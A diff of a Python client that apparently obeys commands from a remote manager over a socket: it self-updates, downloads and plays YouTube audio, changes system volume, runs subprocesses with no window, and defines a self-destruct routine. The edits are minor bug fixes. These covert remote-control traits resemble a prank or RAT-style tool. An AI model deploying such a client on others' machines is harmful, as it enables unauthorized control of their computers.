@@ -111,13 +111,18 @@ def download_yt(url):
         ],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
-        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0
+        creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
+        close_fds=True
     )
 
     audio, error = process.communicate()
 
     if process.returncode != 0:
-        send_manager(s, {"type": "error", "stage": "request", "msg": f"Error on download: {process.returncode}"})
+        send_manager(s, {
+            "type": "error",
+            "stage": "request",
+            "msg": f"Error on download: {error.decode(errors='replace')}"
+        })
         return None
 
     return audio
@@ -175,9 +180,6 @@ def self_destruct():
     sys.exit(0)
 
 def update():
-
-
-
     if getattr(sys, "frozen", False):
         script_path = os.path.abspath(sys.executable)
     else:
@@ -296,19 +298,23 @@ while True:
                 r = None
                 if message.get("type") == 6:
                     update()
+                    continue
+
                 elif message.get("type") == 5:
                     audio = download_yt(message.get("url"))
                     if audio:
                         play_audio(audio)
                         send_manager(s, {"type": "ok", "stage": "request", "msg": f"Video downloaded and played"})
+                    continue
 
                 elif message.get("type") == 4:
                     stop_audio()
                     send_manager(s, {"type": "ok", "stage": "request", "msg": f"Audio stopped"})
+                    continue
 
                 elif message.get("type") == 3:
                     volume = devices.EndpointVolume # type: ignore
-                    vol = max(0.0, min(1.0, message.get("vol")))
+                    vol = max(0.0, min(1.0, float(message.get("vol"))))
                     volume.SetMasterVolumeLevelScalar(vol, None)
                     send_manager(s, {"type": "ok", "stage": "request", "msg": f"Volume changed to: {vol}"})
                     continue
